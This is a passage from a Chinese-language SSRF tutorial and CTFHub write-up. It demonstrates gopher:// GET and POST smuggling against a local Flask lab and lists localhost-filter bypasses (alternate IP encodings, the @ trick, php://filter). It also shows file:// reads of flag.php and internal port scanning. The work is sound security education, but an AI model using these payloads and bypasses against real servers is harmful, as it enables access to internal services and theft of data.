+<li><strong>常用于攻击内网服务</strong>： 许多内网服务（如 Redis）没有密码认证或使用弱密码，并且因为它们在内网，通常缺乏严格的输入过滤。通过 SSRF 结合 Gopher 协议，攻击者可以直接与这些服务交互，执行命令。</li>
+</ul>
+<p>基本语法：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>gopher://&#x3C;host>:&#x3C;port>/_&#x3C;TCP数据流></span></span></code></pre>
+<p><strong>关键点</strong>：</p>
+<ul>
+<li><code>_</code>（下划线）： 后面跟随的数据会被直接发送到目标服务器的 TCP 端口。</li>
+<li><strong>数据流需要经过 URL 编码</strong> ： 因为 URL 本身有特殊字符（如 <code>%</code>, <code>#</code>, <code>?</code>），所以原始数据需要被编码，尤其是换行符 <code>\r\n</code> 需要被编码为 <code>%0D%0A</code>。</li>
+<li><strong>第一个字符</strong> ： 在数据流中，第一个发送的字符会被忽略（通常是用于表示类型的字符，在传统 Gopher 中已不再需要），所以通常我们会用一个无关字符（如 <code>_</code>）或空格（编码为 <code>%20</code>）来占位。</li>
+</ul>
+</li>
+</ol>
+<p><img loading="lazy" src="/2026/02/12/SSRF/gopher.png" class="" title="gopher"></p>
+<p>可以看到传输符号类内容必须经过URL编码</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>注意不要忘记后面那个下划线"_"，下划线"_"后面才开始接TCP数据流，如果不加这个"_"，那么服务端收到的消息将不是完整的，该字符可随意写。</span></span>
+<span class="line"><span> gopher的默认端口是70</span></span>
+<span class="line"><span>如果发起POST请求，回车换行需要使用`%0d%0a`来代替`%0a`，如果多个参数，参数之间的&#x26;也需要进行URL编码</span></span></code></pre>
+<p>Gopher协议发送http <strong>GET</strong>请求：</p>
+<p>我首先用flask框架搭建了一个简单的可访问内容：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>from flask import Flask,request</span></span>
+<span class="line"><span>app = Flask(__name__)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>@app.route('/login',methods = ['GET'])</span></span>
+<span class="line"><span>def login():</span></span>
+<span class="line"><span>    user = request.args.get('nm')</span></span>
+<span class="line"><span>    return 'success,%s' % user</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if __name__ == '__main__':</span></span>
+<span class="line"><span>    app.run(host='0.0.0.0',port=5000,debug=False)</span></span></code></pre>
+<p>这样我在抓包的时候就能看到这样一个内容：</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/flask.png" class="" title="flask"></p>
+<p>GET型http数据包为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GET /login?nm=ZLARYY HTTP/1.1</span></span>
+<span class="line"><span>Host: 192.168.1.40:5000</span></span></code></pre>
+<p>我们将他URL编码之后变成：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%47%45%54%20%2f%6c%6f%67%69%6e%3f%6e%6d%3d%5a%4c%41%52%59%59%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30</span></span></code></pre>
+<p>然后我们手动添加上%0d%0a（这个的目的是表示http请求结束）：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%47%45%54%20%2f%6c%6f%67%69%6e%3f%6e%6d%3d%5a%4c%41%52%59%59%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a</span></span></code></pre>
+<p>最后我们试着用gopher协议发送</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>curl gopher://192.168.1.40:5000/_%47%45%54%20%2f%6c%6f%67%69%6e%3f%6e%6d%3d%5a%4c%41%52%59%59%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/gopher2.png" class="" title="gopher2"></p>
+<p>可以看到最后成功显示了success,ZLARYY，说明我们的GET请求发送成功</p>
+<p>Gopher协议发送http <strong>POST</strong>请求：</p>
+<p>同样的，简单修改了一下：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>from flask import Flask,request</span></span>
+<span class="line"><span>app = Flask(__name__)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>@app.route('/login',methods = ['POST'])</span></span>
+<span class="line"><span>def login():</span></span>
+<span class="line"><span>    user = request.form['nm']</span></span>
+<span class="line"><span>    return 'success,%s' % user</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if __name__ == '__main__':</span></span>
+<span class="line"><span>    app.run(host='0.0.0.0',port=5000,debug=False)</span></span></code></pre>
+<p>抓包之后有如下内容：</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/post.png" class="" title="post"></p>
+<p>在使用gopher协议传递POST请求时，需包含如下内容：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /login HTTP/1.1</span></span>
+<span class="line"><span>Host: 192.168.1.40:5000</span></span>
+<span class="line"><span>Content-Type: application/x-www-form-urlencoded</span></span>
+<span class="line"><span>Content-Length: 9</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>nm=ZLARYY</span></span></code></pre>
+<p>最后一个是post传参内容，我们将其URL编码</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59</span></span></code></pre>
+<p>最后再加上%0d%0a在末尾</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0a</span></span></code></pre>
+<p>接下来我们试着用gopher协议发送</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/post2.png" class="" title="post2"></p>
+<p>成功了，这里提几个注意点：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /login HTTP/1.1</span></span>
+<span class="line"><span>Host: 192.168.1.40:5000</span></span>
+<span class="line"><span>Content-Type: application/x-www-form-urlencoded</span></span>
+<span class="line"><span>Content-Length: 9</span></span>
+<span class="line"><span>/*Content-Length与POST传参内容之间必须有一行间隔，其次POST、Host、Content-Type和Content-Length缺一不可*/</span></span>
+<span class="line"><span>nm=ZLARYY</span></span></code></pre>
+<p>还有一个在做实验的时候发现的有意思的东西：</p>
+<p>经过我URL编码之后的内容，可以无需将所有的%0a替换为%0d%0a，只需要在末尾加上%0d%0a就行；可以先加上%0d%0a再将所有的%0a替换为%0d%0a，也可以先将%0a全部替换为%0d%0a之后再加上%0d%0a</p>
+<p>就拿上一个发送POST包来说：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>//URL直接编码结果</span></span>
+<span class="line"><span>%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>//在末尾直接加上%0d%0a而不对其他内容做任何修改：</span></span>
+<span class="line"><span>%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0a</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/suc.png" class="" title="suc"></p>
+<p>成功拿到响应</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>//URL编码之后先进行一次将%0a全部替换为%0d%0a的操作</span></span>
+<span class="line"><span>%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%6e%6d%3d%5a%4c%41%52%59%59</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>//再在末尾添加上%0d%0a</span></span>
+<span class="line"><span>%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0a</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/suc2.png" class="" title="suc2"></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>//URL编码之后直接在末尾加上%0d%0a</span></span>
+<span class="line"><span>%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0a%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0a</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>//再进行一次替换</span></span>
+<span class="line"><span>%50%4f%53%54%20%2f%6c%6f%67%69%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%39%32%2e%31%36%38%2e%31%2e%34%30%3a%35%30%30%30%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%6e%6d%3d%5a%4c%41%52%59%59%0d%0d%0a</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/suc3.png" class="" title="suc3"></p>
+<p>都是可行的</p>
+<h2 id="绕过手法"><a class="anchor" href="#绕过手法">#</a> 绕过手法</h2>
+<ol>
+<li>
+<p>如果过滤掉了localhost和127.0.0.1，可以采用如下绕过手法：</p>
+<ul>
+<li>
+<p>**302跳转：**网络上存在一个名为<code>sudo.cc</code>的服务，放访问这个服务时，会自动重定向到<code>127.0.0.1</code></p>
+</li>
+<li>
+<p>**特殊数字：**例如②，可以使用1②7.0.0.1</p>
+</li>
+<li>
+<p>**。代替.绕过：**127。0。0。1</p>
+</li>
+<li>
+<p>**省略0：**使用127.1代替127.0.0.1</p>
+</li>
+<li>
+<p>**进制转换 ：**采用127.0.0.1的其他进制形式</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>0177.0.0.1 //八进制</span></span>
+<span class="line"><span>0x7f.0.0.1 //十六进制</span></span>
+<span class="line"><span>2130706433 //十进制</span></span></code></pre>
+</li>
+<li>
+<p>**特殊0：**在windows中，0代表<code>0.0.0.0</code>，而在linux下，0代表<code>127.0.0.1</code>，如下所示：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>?url=http://0/flag.php</span></span></code></pre>
+</li>
+<li>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://localhost/         # localhost就是代指127.0.0.1  </span></span>
+<span class="line"><span>http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1  </span></span>
+<span class="line"><span>http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行  </span></span>
+<span class="line"><span>http://[::]:80/           # 在liunx下可用，window测试了下不行  </span></span>
+<span class="line"><span>http://127。0。0。1/       # 用中文句号绕过  </span></span>
+<span class="line"><span>http://①②⑦.⓪.⓪.①  </span></span>
+<span class="line"><span>http://127.1/  </span></span>
+<span class="line"><span>http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span></span></code></pre>
+<p>from：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Reme_mber/article/details/125581479">从一文中了解SSRF的各种绕过姿势及攻击思路_ssrf绕过-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://xiexie-qiuligao.github.io/2026/01/14/SSRF%20and%20CSRF/">https://xiexie-qiuligao.github.io/2026/01/14/SSRF and CSRF/</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p>如果题目要求必须以（eg：<a target="_blank" rel="noopener" href="http://ZLARYY.com">ZLARYY.com</a>）开头，可以采用@绕过 ：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/?url=http://ZLARYY.com@127.0.0.1/flag.php</span></span></code></pre>
+</li>
+<li>
+<p>如果题目要求必须包含（eg：<a target="_blank" rel="noopener" href="http://ZLARYY.com">ZLARYY.com</a>），并且不限制协议，可以采用php://filter过滤器绕过：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/?url=php://filter/ZLARYY.com/resource=/flag.php</span></span></code></pre>
+</li>
+</ol>
+<h2 id="ctfhub上的ssrf题目"><a class="anchor" href="#ctfhub上的ssrf题目">#</a> CTFHub上的SSRF题目：</h2>
+<h3 id="内网访问"><a class="anchor" href="#内网访问">#</a> 内网访问：</h3>
+<p>访问给的连接发现他直接在URL上加上了/?url=_</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://challenge-7c6228e818330f28.sandbox.ctfhub.com:10800/?url=_</span></span></code></pre>
+<p>结合给的提示：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>尝试访问位于127.0.0.1的flag.php吧</span></span></code></pre>
+<p>应该是希望我们利用SSRF探测内网</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/1-1.png" class="" title="1-1"></p>
+<p>成功拿到flag</p>
+<h3 id="伪协议读取文件"><a class="anchor" href="#伪协议读取文件">#</a> 伪协议读取文件：</h3>
+<p>本题直接访问与上一题一样，只不过提示变成了：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>尝试去读取一下Web目录下的flag.php吧</span></span></code></pre>
+<p><img loading="lazy" src="/2026/02/12/SSRF/2-1.png" class="" title="2-1"></p>
+<p>这里我们直接访问行不通，看来是过滤了http，https协议，我们试着用file协议读取</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/2-2.png" class="" title="2-2"></p>
+<p>这里的Web目录其实就是/var/www/html的意思，可惜这道题貌似不能用php://filter读取</p>
+<h3 id="端口扫描"><a class="anchor" href="#端口扫描">#</a> 端口扫描：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</span></span></code></pre>
+<p>这提示我们去爆破试试</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/3-1.png" class="" title="3-1"></p>
+<p>Payload Type我们选择Numbers，From 8000 to 9000</p>
+<p><img loading="lazy" src="/2026/02/12/SSRF/3-2.png" class="" title="3-2"></p>
+<p>最后按长度排序就能找到响应与其他不同的端口了</p>
+<h3 id="post请求"><a class="anchor" href="#post请求">#</a> POST请求：</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</span></span></code></pre>
+<p>我们 传入/?url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%E4%B9%8B%E5%90%8E%E6%89%93%E5%BC%80%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0">http://127.0.0.1/flag.php之后打开开发者工具可以看到</a></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-html"><span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">&#x3C;!-- Debug: key=49719164264cb75cf9f7de397bdbe95e--></span></span></code></pre>
+<p>当我们试着用伪协议读取/var/www/html/flag.php时，看到了这样一串代码：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-php"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">!--?</span><span style="color:#A65E2B;--shiki-dark:#C99076">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">error_reporting</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2F798A;--shiki-dark:#4C9A91">0</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_SERVER</span><span style="color:#1e754f;--shiki-dark:#4d9375">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">REMOTE_ADDR</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#1e754f;--shiki-dark:#4d9375">]</span><span style="color:#AB5959;--shiki-dark:#CB7676"> !=</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">127.0.0.1</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">    echo</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Just View From 127.0.0.1</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">    return</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">flag</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#998418;--shiki-dark:#B8A965">getenv</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">CTFHUB</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">key</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#998418;--shiki-dark:#B8A965"> md5</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">flag</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#998418;--shiki-dark:#B8A965">isset</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_POST</span><span style="color:#a65e2b;--shiki-dark:#d4976c">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">key</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a65e2b;--shiki-dark:#d4976c">]</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#AB5959;--shiki-dark:#CB7676"> &#x26;&#x26;</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">_POST</span><span style="color:#1e754f;--shiki-dark:#4d9375">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">key</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#1e754f;--shiki-dark:#4d9375">]</span><span style="color:#AB5959;--shiki-dark:#CB7676"> ==</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">key</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">    echo</span><span style="color:#999999;--shiki-dark:#666666"> $</span><span style="color:#B07D48;--shiki-dark:#BD976A">flag</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">    exit</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">&#125;</span></span>
+<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">?--</span><span style="color:#AB5959;--shiki-dark:#CB7676">></span></span></code></pre>
+<p>看WP还多读了一个文件：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-php"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#A65E2B;--shiki-dark:#C99076">php</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//关闭错误报告</span></span>
+<span class="line"><span style="color:#998418;--shiki-dark:#B8A965">error_reporting</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2F798A;--shiki-dark:#4C9A91">0</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">//判断url参数是否存在</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">if</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#AB5959;--shiki-dark:#CB7676">!</span><span style="color:#998418;--shiki-dark:#B8A965">isset</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_REQUEST</span><span style="color:#a65e2b;--shiki-dark:#d4976c">[</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">url</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#a65e2b;--shiki-dark:#d4976c">]</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">&#123;</span></span>
